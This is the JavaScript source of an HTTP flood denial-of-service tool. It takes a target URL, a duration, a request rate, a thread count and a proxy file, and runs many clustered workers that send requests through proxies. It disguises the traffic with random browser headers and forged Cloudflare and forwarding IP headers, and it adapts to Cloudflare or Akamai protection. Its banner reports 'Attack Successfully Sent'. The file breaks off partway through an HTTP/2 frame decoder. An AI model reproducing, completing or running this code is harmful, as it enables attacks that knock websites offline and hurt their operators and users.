//  //  //  //  // 
// Made By NCkx // <3
//  //  //  //  //
const errorHandle = error => {
	return error;
};
process.on('uncaughtException', errorHandle);
process.on('unhandledRejection', errorHandle);
const net = require("net");
 const HPACK = require('hpack');
 const http2 = require("http2");
 const tls = require("tls");
 const http = require('http')
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const os = require("os");
 const util = require('util');
 const dns = require('dns');
 const fetch = require('node-fetch');
 const fs = require("fs");
 const colors = require('colors')
 const Chance = require('chance');
 const chance = new Chance();
 const lookupPromise = util.promisify(dns.lookup);
 const { v4: uuidv4 } = require('uuid');

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;

 //  //  //  //  //  //  // Don't Forget To Credit it!  //  //  //  //  //  //  //

 if (process.argv.length < 8){
    console.log(`\x1b[31mUh oh, Wrong ussage! Please try again. The usage is: node raw.js url time rate threads proxyfile method\nThe methods are GET, POST and The methods are GET, POST and FLOOD\nNote: FLOOD is using both methods GET and POST!\x1b[0m`);
    process.exit();
 }
 let val 
 let isp
 let pro
 async function getIPAndISP(url) {
  try {
    const { address } = await lookupPromise(url);
    const apiUrl = `http://ip-api.com/json/${address}`;
    const response = await fetch(apiUrl);
    if (response.ok) {
      const data = await response.json();
       isp = data.isp;
      console.log(' ISP :', url, ':', isp);
	  if (isp === 'Cloudflare, Inc.') {
	  }else if (isp === 'Akamai Technologies, Inc.' && 'Akamai International B.V.') {
		 pro = {'Quic-Version' : '0x00000001'}
		 val = { 'NEl': JSON.stringify({
			"report_to":"default",
			"max_age":3600,
			"include_subdomains":true}),
		  }
	  } else {
		val = {'Etag': "71735e063326b9646d2a4f784ac057ff"}
		pro = {'Strict-Transport-Security': 'max-age=31536000'}
	  }
    } else {
     return
    }
  } catch (error) {
    return
   }
 }
 let headers = [];
 const statusesQ = [];
 let statuses = {};
 const current_time = new Date();
 const http_time = current_time.toUTCString();
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 

 const randInt = (min, max) => Math.floor(Math.random() * (max - min) + min);
 const randList = list => list[Math.floor(Math.random() * list.length)];
 const ecdhCurve = 'auto';
 const characters = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM';

 const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6],
    choose_methods: process.argv[7],
 };
 if (process.argv[7] != 'GET' && process.argv[7] != 'POST' && process.argv[7] != 'FLOOD' && process.argv[7] != 'POSTDATA') {
    console.error('Please choose a method! The methods are GET, POST, FLOOD and POSTDATA');
    process.exit(1)
 }
 let bothtomethodname = process.argv[7];
 
 if (bothtomethodname === "FLOOD") {
    bothtomethodname = "FLOOD";
 };
 if (process.argv[7] === 'GET') {
    if (process.argv.length < 9){
        console.log(`\x1b[31mUh oh, Wrong ussage! Please try again. The usage is: node raw.js url time rate threads proxyfile method true/false\x1b[0m`);
        console.log("\x1b[31mNote: FLOOD is using both methods GET and POST & True/false is using query or not.\x1b[0m")
        process.exit(1);
    }
 };
 const parsedTarget = new URL(args.target);
 const target_url = parsedTarget.host;
 parsedTarget.path = parsedTarget.pathname + parsedTarget.search;
 getIPAndISP(target_url);

 Object.prototype.shuffle = function () {
    const entries = Object.entries(this);
    for (let entry = entries.length - 1; entry > 0; entry--) {
        const index = randInt(0, entry + 1);
        [entries[entry], entries[index]] = [entries[index], entries[entry]];
    }
    return Object.fromEntries(entries);
 }

 const accept_header = [
	'*/*',
	'image/avif,image/webp,*/*',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
	'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	'application/json,text/plain,*/*',
	'text/css,*/*;q=0.1',
	'application/javascript,*/*;q=0.8',
	'application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
	'application/xml;q=0.1,text/html;q=0.9,octet-stream;q=0.7,image/png,image/*;q=0.8,*/*;q=0.5',
	'application/json,text/javascript,*/*;q=0.01',
	'application/json,text/javascript,*/*;q=0.8',
	'image/jpeg,image/gif,image/pjpeg,application/x-ms-application,application/xaml+xml,application/x-ms-xbap,*/*',
	'application/xml,application/xhtml+xml,text/html,text/plain,image/png,*/*;q=0.8',
	'application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
	'image/png,image/*;q=0.8,*/*;q=0.5',
	'application/json,text/html;q=0.9,application/xhtml+xml;q=0.8',
	'image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel'
 ]; 
 const lang_header = ['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.9', 'es-ES,es;q=0.9', 'it-IT,it;q=0.9', 'pt-BR,pt;q=0.9', 'ja-JP,ja;q=0.9', 'zh-CN,zh;q=0.9', 'ko-KR,ko;q=0.9', 'ru-RU,ru;q=0.9', 'ar-SA,ar;q=0.9', 'hi-IN,hi;q=0.9', 'ur-PK,ur;q=0.9', 'tr-TR,tr;q=0.9', 'id-ID,id;q=0.9', 'nl-NL,nl;q=0.9', 'sv-SE,sv;q=0.9', 'no-NO,no;q=0.9', 'da-DK,da;q=0.9', 'fi-FI,fi;q=0.9', 'pl-PL,pl;q=0.9', 'cs-CZ,cs;q=0.9', 'hu-HU,hu;q=0.9', 'el-GR,el;q=0.9', 'pt-PT,pt;q=0.9', 'th-TH,th;q=0.9', 'vi-VN,vi;q=0.9', 'he-IL,he;q=0.9', 'fa-IR,fa;q=0.9', 'ur-IN,ur;q=0.9', 'ro-RO,ro;q=0.9', 'bg-BG,bg;q=0.9', 'hr-HR,hr;q=0.9', 'sk-SK,sk;q=0.9', 'sl-SI,sl;q=0.9', 'sr-RS,sr;q=0.9', 'uk-UA,uk;q=0.9', 'et-EE,et;q=0.9', 'lv-LV,lv;q=0.9', 'lt-LT,lt;q=0.9', 'ms-MY,ms;q=0.9', 'fil-PH,fil;q=0.9', 'zh-TW,zh;q=0.9', 'es-AR,es;q=0.9', 'en', 'en,en-US;q=0.9', 'en,en-GB;q=0.9', 'en,fr-FR;q=0.9,fr;q=0.8', 'en,de;q=0.9', 'en,it;q=0.9,it-IT;q=0.8', 'en,fr-CA;q=0.9,fr;q=0.8', 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6', 'en,es;q=0.9,es-AR;q=0.8,es-MX;q=0.7', 'en,tr;q=0.9', 'en,ru;q=0.9', 'fr,en-gb;q=0.7,en;q=0.3', 'en-US;q=0.5,en;q=0.3', 'fr-CH,fr;q=0.9', 'en;q=0.8,de;q=0.7', 'de;q=0.7,*;q=0.5', 'en-US,en;q=0.5', 'es-mx,es,en', 'vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3', 'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7', 'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5', 'de-CH;q=0.7', 'da, en-gb;q=0.8, en;q=0.7', 'cs;q=0.5', 'en-CA,en;q=0.9', 'en-AU,en;q=0.9', 'en-NZ,en;q=0.9', 'en-ZA,en;q=0.9', 'en-IE,en;q=0.9', 'en-IN,en;q=0.9', 'ca-ES,ca;q=0.9', 'cy-GB,cy;q=0.9', 'eu-ES,eu;q=0.9', 'gl-ES,gl;q=0.9', 'gu-IN,gu;q=0.9', 'kn-IN,kn;q=0.9', 'ml-IN,ml;q=0.9', 'mr-IN,mr;q=0.9', 'nb-NO,nb;q=0.9', 'nn-NO,nn;q=0.9', 'or-IN,or;q=0.9', 'pa-IN,pa;q=0.9', 'sw-KE,sw;q=0.9', 'ta-IN,ta;q=0.9', 'te-IN,te;q=0.9', 'zh-HK,zh;q=0.9', 'fil-PH,fil;q=0.8', 'fr-CA,fr;q=0.8', 'fr-CH,fr;q=0.8', 'fr-BE,fr;q=0.8', 'fr-LU,fr;q=0.8', 'vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3'];
 const encoding_header = ['gzip, deflate, br', 'gzip, deflate', 'gzip, br', 'deflate, br', 'gzip', 'deflate', 'br'];
 const control_header = [
    'max-age=0',
	'no-cache',
	'no-store',
	'no-transform',
	'only-if-cached',
 ];

 const dest_header = ['document', 'empty', 'iframe', 'font', 'image', 'script'];
 const mode_header = ['cors', 'no-cors', 'navigate', 'same-origin', 'websocket'];
 const site_header = ['cross-site', 'same-site', 'same-origin', 'none'];
 const referers = [
	parsedTarget.href,
    parsedTarget.origin,
    "https://www.google.com",
    "https://www.bing.com",
    "https://coccoc.com",
    "https://es.wikipedia.org",
    "https://en.wikipedia.org",
    "https://duckduckgo.com",
    "https://new.qq.com",
    "https://www.ecosia.org",
    "https://search.naver.com",
    "https://yandex.com",
    "https://www.baidu.com",
    "https://search.yahoo.com",
 ];
 const referer = randList(referers);
 const versions = {
	APPLE: () => {
		const octets = [];
		octets[0] = randInt(10, 20);
		octets[1] = randInt(0, 10);
		const lastDigit = randInt(0, 10);
		if (lastDigit !== 0) octets[2] = lastDigit;
		return octets.join('_');
	},
	ANDROID: () => {
		const octets = [];
		octets[0] = randInt(5, 15);
		const secondaryDigit = randInt(0, 10);
		const lastDigit = randInt(0, 10);
		if (secondaryDigit !== 0) octets[1] = secondaryDigit;
		if (lastDigit !== 0) octets[2] = lastDigit;
		return octets.join('.');
	},
	SAFARI: () => {
		const octets = [];
		octets[0] = randInt(500, 600);
		octets[1] = '1';
		const safariLastDigit = randInt(0, 20);
		if (safariLastDigit !== 0) octets[2] = safariLastDigit;
		return octets.join('.')
	},
	ANDROID_DEVICE: () => path('*', '*', 2) + '-' + randList(characters) + randInt(100, 1000) + randList(characters),
	CHROME: () => Math.random() < 0.5 ? '121' + '.0.' + randInt(4000, 6000) + '.' + randInt(10, 200) : '121.0.0.0',
	MOBILE: () => randInt(10, 20) + randList(characters).toUpperCase() + randInt(10, 200)
 };

    function getUserAgent() {
        const randVersions = {
            apple: versions.APPLE(),
            android: versions.ANDROID(),
            safari: versions.SAFARI()
        };
        const systems = [
            'Windows NT 10.0; Win64; x64',
            'Windows NT 10.0; WOW64',
            'Windows NT 10.0',
            'X11; Linux x86_64',
            'Macintosh; Intel Mac OS X ' + randVersions.apple,
            'iPhone; CPU iPhone OS ' + randVersions.apple + ' like Mac OS X',
            'iPad; CPU OS ' + randVersions.apple + ' like Mac OS X',
            'iPod; CPU iPhone OS ' + randVersions.apple + ' like Mac OS X',
            'Linux; Android ' + randVersions.android + '; ' + versions.ANDROID_DEVICE().toUpperCase(),
            'Linux; Android ' + randVersions.android + '; K'
        ];
        const system = randList(systems);
        const engine = system.includes('CPU') ? 'Mobile/' + versions.MOBILE() + ' Safari/' + randVersions.safari : 'Safari/' + randVersions.safari;
        return 'Mozilla/5.0 (' + system + ') AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + versions.CHROME() + ' ' + engine;
    }

 function randIPv4() {
    let address;
    do {
        const firstOctet = randInt(1, 224);
        if (
            firstOctet === 0 ||
            firstOctet === 10 ||
            firstOctet === 100 ||
            firstOctet === 127 ||
            firstOctet === 169 ||
            firstOctet === 172 ||
            firstOctet === 192 ||
            firstOctet === 198 ||
            firstOctet === 203
        ) {
            continue;
        }
        if (firstOctet >= 224 && firstOctet <= 239) {
            continue;
        }
        address = firstOctet + '.' + randInt(1, 256) + '.' + randInt(1, 256) + '.' + randInt(1, 256);
    } while (!address);
    return address;
 }

 function path(input, sign, length) {
	let output = '';
	for (let index = 0; index < length; index++) {
		output += randList(characters);
	}
	return input.split(sign).join(output);
 }


 var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
 var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var proxies = readLines(args.proxyFile);

 const MAX_RAM_PERCENTAGE = 10000;
 const RESTART_DELAY = 1000;

 if (cluster.isPrimary) {
    const proxyList = readLines(args.proxyFile);
    console.clear();
    console.log(` Made By @justcallNck \x1b[31mwith luv <3\x1b[0m`)
    console.log(`\x1b[93m  [?] Attack Details:\x1b[0m`)
    console.log(` ----------------------`)
    console.log(`   -   Status    : [ \x1b[32mAttack Successfully Sent\x1b[0m ]`)
    console.log(`   -   Target    : [ \x1b[34m${parsedTarget.host}\x1b[0m ]`)  
    console.log(`   -   Time      : [ \x1b[34m${process.argv[3]}\x1b[0m ]`)
    console.log(`   -   Rps       : [ \x1b[34m${process.argv[4]}\x1b[0m ]`)
    console.log(`   -   Threads   : [ \x1b[34m${process.argv[5]}\x1b[0m ]`)
    console.log(`   -   Method    : [ \x1b[34m${bothtomethodname}\x1b[0m ]`)
    console.log(`   -   Proxyfile : [ \x1b[34m${process.argv[6]}\x1b[0m ] | Total(s): [ \x1b[34m${proxyList.length}\x1b[0m ]`)
    console.log(`----------------------------------------------------------------------`)
    console.log(`| \x1b[31m[!] Note: \x1b[0mrecommend use good and big proxyfile if hit hard targets.|`)
    console.log(`----------------------------------------------------------------------`)
    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting the script via', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage percentage exceeded:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
  setInterval(handleRAMUsage, 1000);
  
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    cluster.on('exit', worker => {
		cluster.fork();
	});
 } else {
    setInterval(startNckFlood, 0)
 }
 
 function createSocket() {
	const socket = new net.Socket();
	socket.allowHalfOpen = true;
	socket.writable = true;
	socket.readable = true;
	socket.setNoDelay(true);
	socket.setKeepAlive(true, args.time);
	return socket;
  }
  class NetSocket {
    constructor() {}
  
    HTTP(options, callback) {
        const socket = createSocket();
        const buffer = Buffer.from('CONNECT ' + options.address + ' HTTP/1.1\r\nHost: ' + options.address + '\r\n\r\n');
        const timeout = setTimeout(() => socket.destroy(), options.timeout);
        socket.connect(options.port, options.host)
        
        socket.on("connect", () => {
            clearTimeout(timeout);
            socket.write(buffer);
        });
  
        socket.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                socket.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(socket, undefined);
        });
  
        socket.on("timeout", () => {
            socket.destroy();
            return callback(undefined, "error: timeout exceeded");
        });
  
        socket.on("error", error => {
            socket.destroy();
            return callback(undefined, "error: " + error);
        });
    }
    
    }
    function generateRandomString(minLength, maxLength) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
        const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
        let result = '';
        
        for (let i = 0; i < length; i++) {
            const randomIndex = Math.floor(Math.random() * characters.length);
            result += characters.charAt(randomIndex);
        }
    
        return result;
    }

 function generateRandomUpperCaseLetter() {
    const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
    const randomIndex = Math.floor(Math.random() * alphabet.length);
    const randomLetter = alphabet.charAt(randomIndex);
    return randomLetter;
  }
  
  function generateRandomUpperCaseString(length) {
    let result = '';
    for (let i = 0; i < length; i++) {
      result += generateRandomUpperCaseLetter();
    }
    return result;
  }

  function generateRandomEmail() {
    const firstName = chance.first().toLowerCase();
    const lastName = chance.last().toLowerCase();
    const randomString = chance.string({ length: 5, pool: 'abcdefghijklmnopqrstuvwxyz0123456789' }).toLowerCase();
    const domain = [
      "@hotmail.com",
      "@outlook.com.vn",
      "@outlook.uk.com",
      "@yahoo.com",
      "@rambler.ru",
      "@gmail.com",
      "@nck.ovh",
      "@cloudflare.com"
    ];
    const rand_domain = domain[Math.floor(Math.random() * domain.length)]
    const email = `${firstName}.${lastName}.${randomString}${rand_domain}`;
    return email;
  }

 function getRandomUUID() {
    return uuidv4();
 }	

 const randomEmail = generateRandomEmail();

 const randomUpperCaseString = generateRandomUpperCaseString(65);

 const platformuserAgent = getUserAgent();

 const platform = platformuserAgent.includes('Windows') ? '"Windows"' : platformuserAgent.includes('X11') ? '"Linux"' : platformuserAgent.includes('Android') ? '"Android"' : platformuserAgent.includes('Macintosh') ? '"macOS"' : platformuserAgent.includes('like Mac OS X') ? '"iOS"' : '"Unknown"';

 const viaValues = [
	'1.0 squid (squid/5.2)',
	'1.1 ::ffff:' + randIPv4() + ' (Mikrotik HttpProxy)',
	'1.1 ' + randIPv4() + ' (Mikrotik HttpProxy)',
	'1.0 ' + randIPv4() + ' (squid/4.7)',
 ];
 
 const hash = crypto.createHash('md5').update(new Date() * Math.random() + "").digest('hex');
 
 const platformVersions = ['"6.2.0"', '"15.0.0"', '"13.4.0"', '"13.0.0"'];
 
 const weightValues = [1, 220, 255, 256];
 function getRandomDate(start = new Date(2000, 0, 1), end = new Date()) {
    return new Date(start.getTime() + Math.random() * (end.getTime() - start.getTime()));
 }
 function getLastModified() {
    const randomDate = new Date(Date.UTC(2000, 0, 1) + Math.random() * (new Date() - new Date(Date.UTC(2000, 0, 1))));
    
    const lastModified = randomDate.toUTCString();
    
    return lastModified;
 }
 const methods = ["POST", "GET"];

 const fakeHeaders = {
    'x-real-ip': randIPv4(),
    'x-forwarded-host': parsedTarget.host,
    'x-forwarded-server': parsedTarget.host,
    'x-forwarded-for': randIPv4(),
    'x-forwarded-proto': 'https',
 };

 const rateHeaders = [
    { 'CF-Visitor': '{"scheme":"https"}' },
    { 'CDN-Loop': 'cloudflare' },
    { 'CF-RAY': hash.substring(0, 16) + '-HKG' },
    { 'CF-Worker': parsedTarget.host },
    { 'CF-IPCountry': 'US' },
    { 'dnt': '1' },
    { 'device-memory': '0.25' },
    { 'viewport-height': '1080' },
    { 'x-forwarded-port': '443' },
    { 'x-forwarded-protocol': 'https' },
    { 'pragma': 'no-cache' },
    { 'via': randList(viaValues) },
    { 'cookie': hash.substring(16, 24) + '=' + hash.substring(24, 32) },
    { 'worker': 'true'},
    { 'sec-ch-ua-wow64': '?0' },
    { 'sec-ch-ua-model': versions.ANDROID_DEVICE().toUpperCase() },
    { 'sec-ch-ua-arch': 'x86' },
    { 'sec-ch-ua-bitness': '64' },
    { 'sec-ch-ua-full-version': '"120.0.6099.227"' },
    { 'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.227", "Google Chrome";v="120.0.6099.227"' },
    { 'sec-ch-ua-platform-version': randList(platformVersions) },
    { 'priority': 'u=0, i' },
 ];

 const ipv4 = randIPv4()

 const rd = [
    { "A-IM": "Feed" },
    { "accept": accept },
    { "accept-datetime": getRandomDate().toUTCString() },
    { "accept-encoding": encoding },
    { "accept-language": lang },
    { "cdn-loop": 'cloudflare'},
    { "upgrade-insecure-requests": "1" },
    { "cache-control": "no-cache" },
    { "content-encoding": "gzip, deflate, br" },
    { "Expect": "100-continue" },
    { "Forwarded": `for=${ipv4}proto=http;by=` + randIPv4() },
    { "From": randomEmail },
    { "Max-Forwards": randInt(0,200) },
    { "pragma": "no-cache" },
    { "CF-Worker": parsedTarget.host },
    { "CF-Connecting-IP": randIPv4() }, 
    { "CF-EW-Client-IP": randIPv4() }, 
    { "CF-Challenge-Response": randstrs(32) },
    { "CF-Request-ID": getRandomUUID() },
    { "CF-Ray": hash.substring(0, 16) + '-HKG' },
    { "CF-Ratelimit-Remaining": Math.floor(Math.random() * 100) },
    { "CF-Ratelimit-Limit": Math.floor(Math.random() * 200) + 100 },
  ];
  
  const rd1 = [
    { "Via": '1.1' + parsedTarget.host },
    { "X-Requested-With": "XMLHttpRequest" },
    { "X-Forwarded-For": randIPv4() },
    { "X-Vercel-Cache": randstrs(15) },
    { "Alt-Svc": "http/1.1=http2." + parsedTarget.host + "; ma=7200" },
    { "downlink": Math.floor(Math.random() * 10) + 1 },
    { "TK": "?" },
    { "X-Frame-Options": "deny" },
    { "X-ASP-NET": randstrs(25) },
    { "Refresh": randInt(0,20) },
    { "RTT": Math.floor(Math.random() * 3000) + 1 },
    { "X-Content-duration": randIPv4() },
    { "service-worker-navigation-preload": 'null' },
    { 'Nel': '{ "report_to": "name_of_reporting_group", "max_age": 12345, "include_subdomains": false, "success_fraction": 0.0, "failure_fraction": 1.0 }'},
    { "CF-Connecting-IP": randIPv4() }, 
    { "CF-EW-Client-IP": randIPv4() }, 
    { "CF-Request-ID": getRandomUUID() },
    { "CF-WAF-Action": "Manage challenge" },
  ];


 const reqSettings = {
	parent: 0,
	exclusive: true,
	weight: randList(weightValues),
 };


 //  const p = parsedTarget.path.replace(/%RAND%/g, () => Array.from({ length: 16 }, () => Math.floor(Math.random() * 36).toString(36)).join(''));
 function buildPathWithQuery(parsedTarget, useQuery) {
    if (useQuery) {
        return parsedTarget.path + '?' + generateRandomString(5, 15) + '=' + generateRandomString(20, 25);
    } else {
        return path(parsedTarget.path, '[rand]', 8);
    };
 };

 function randstrs(length) {
    const characters = "0123456789";
    const charactersLength = characters.length;
    const randomBytes = crypto.randomBytes(length);
    let result = "";
    for (let i = 0; i < length; i++) {
        const randomIndex = randomBytes[i] % charactersLength;
        result += characters.charAt(randomIndex);
    }
    return result;
 }

 var articles = "The,All of the,Most of the,Some of the,My,Your,His,Her,Their,Our,Everybody's,Almost all of the,That,I knew that the,We knew that the,She knew that the,He knew that the,They knew that the".split(",");
 var nouns = "darkness,morning,light,feeling,beauty,love,hatred,expression,message,happiness,sadness,anger,frustration".split(",");
 var lv = "was,could be,might be,should have been,would have been,could have been".split(",");
 var adjectives = "abstract,mysterious,permanent,unfortunate,intricate,confusing,true,false,fake,a lie,a stranger,a friend,serene,confusing,an enemy,terrible,enchanting,mine,yours,his,hers,theirs,ours,fortunate,understood,mine,interesting,mutual,artistic,musical".split(",");
 var x;
 
 var final = "";
 var ta = articles[Math.floor(Math.random() * articles.length)];
 var tb = nouns[Math.floor(Math.random() * nouns.length)];
 final += ta + " " + tb + " ";
 for (x = 0; x < 3; x++) {
   var a = articles[Math.floor(Math.random() * articles.length)];
   var b = nouns[Math.floor(Math.random() * nouns.length)];
   var c = lv[Math.floor(Math.random() * lv.length)];
   var d = adjectives[Math.floor(Math.random() * adjectives.length)];
   final += a + " " + b + " " + c + " " + d;
   if (x % 4 == 3) {
     final += " ";
   } else {
     final += ". ";
   }
 }
  
 function buildRequest() {
    const browserVersion = randInt(120, 123);

    const fwfw = ['Google Chrome', 'Brave'];
    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];

    let brandValue;
    if (browserVersion === 120) {
        brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    } 
    else if (browserVersion === 121) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
    }
    else if (browserVersion === 122) {
        brandValue = `"Chromium";v="${browserVersion}", "Not(A:Brand";v="24", "${wfwf}";v="${browserVersion}"`;
    }
    else if (browserVersion === 123) {
        brandValue = `"${wfwf}";v="${browserVersion}", "Not:A-Brand";v="8", "Chromium";v="${browserVersion}"`;
    }

    const isBrave = wfwf === 'Brave';

    const acceptHeaderValue = isBrave
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
    
    const userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
    const secChUa = `${brandValue}`;

    let mysor = '\r\n';
    let mysor1 = '\r\n';

    let headers = `GET ${parsedTarget.pathname} HTTP/1.1\r\n` +
        `Accept: ${acceptHeaderValue}\r\n` +
        'Accept-Encoding: gzip, deflate, br\r\n' +
        'Accept-Language: en-US,en;q=0.7\r\n' +
        'Connection: Keep-Alive\r\n' +
        `Host: ${parsedTarget.hostname}\r\n` +
        'Sec-Fetch-Dest: document\r\n' +
        'Sec-Fetch-Mode: navigate\r\n' +
        'Sec-Fetch-Site: none\r\n' +
        'Sec-Fetch-User: ?1\r\n' +
        'Upgrade-Insecure-Requests: 1\r\n' +
        `User-Agent: ${userAgent}\r\n` +
        `sec-ch-ua: ${secChUa}\r\n` +
        'sec-ch-ua-mobile: ?0\r\n' +
        'sec-ch-ua-platform:  "Windows"\r\n' + mysor1;


    const mmm = Buffer.from(`${headers}`, 'binary');
    
    return mmm;
 }

 function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) {
        frame = Buffer.concat([frame, payload]);
    }
    return frame;
 }

 function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUInt8(4);
    const streamId = data.readUInt32BE(5);
